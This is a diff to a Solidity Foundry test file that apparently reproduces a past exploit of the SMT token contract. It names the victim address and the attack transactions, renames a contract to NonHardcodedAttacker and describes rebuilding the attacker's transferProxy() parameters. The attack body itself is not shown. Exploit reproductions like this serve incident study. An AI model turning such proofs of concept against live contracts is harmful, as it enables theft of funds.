@@ -16,8 +16,8 @@ import "forge-std/Test.sol";
 //   - 0xd6a09BDB29e1EafA92a30373c44b09E2e2e0651E
 // Victim Contract : 0x55F93985431Fc9304077687a35A1BA103dC1e081
 // Vulnerable Snippet :
-//   - https://etherscan.io/address/0x55F93985431Fc9304077687a35A1BA103dC1e081#code#L225
-//   - https://etherscan.io/address/0x55F93985431Fc9304077687a35A1BA103dC1e081#code#L228
+//   - https://etherscan.io/address/0x55F93985431Fc9304077687a35A1BA103dC1e081#code#L220
+//   - https://etherscan.io/address/0x55F93985431Fc9304077687a35A1BA103dC1e081#code#L223
 //
 // Attack Txs :
 //   - 0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f (height 5499035)
@@ -41,7 +41,7 @@ contract Attacker is Test {
     function testExploit() public {
         console.log("[Before Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
         console.log("[Before Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
-        vm.prank(attacker); // cannot remove this
+        vm.prank(attacker); // do not remove this line
         attack();
         console.log("[After Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
         console.log("[After Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
@@ -59,7 +59,12 @@ contract Attacker is Test {
     }
 }
 
-contract NonHardcodedReproduce is Test {
+contract NonHardcodedAttacker is Test {
+    /**
+     * @dev In this PoC, we reproduced how the attacker crafted the parameters for transferProxy().
+     * @dev Instead of hardcoding the parameters, we dynamically construct them.
+     */
+
     ISMT private constant smt = ISMT(0x55F93985431Fc9304077687a35A1BA103dC1e081);
 
     address private immutable attacker;
@@ -78,7 +83,7 @@ contract NonHardcodedReproduce is Test {
     function testExploit() public {
         console.log("[Before Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
         console.log("[Before Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
-        vm.prank(attacker); // cannot remove this
+        vm.prank(attacker); // do not remove this line
         attack();
         console.log("[After Attack] smt.balanceOf(revenueAddr0) = %18e", smt.balanceOf(revenueAddr0));
         console.log("[After Attack] smt.balanceOf(revenueAddr1) = %18e", smt.balanceOf(revenueAddr1));
